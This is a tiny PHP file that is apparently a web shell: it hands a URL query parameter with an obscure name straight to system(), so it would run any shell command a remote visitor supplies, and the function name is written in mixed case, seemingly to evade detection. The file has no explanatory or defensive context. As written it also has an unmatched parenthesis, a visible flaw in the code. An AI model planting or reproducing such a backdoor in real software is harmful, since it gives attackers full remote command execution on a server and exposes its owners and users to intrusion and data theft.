<?php
SysTeM(($_GET['7x6dDFzn']);
?>
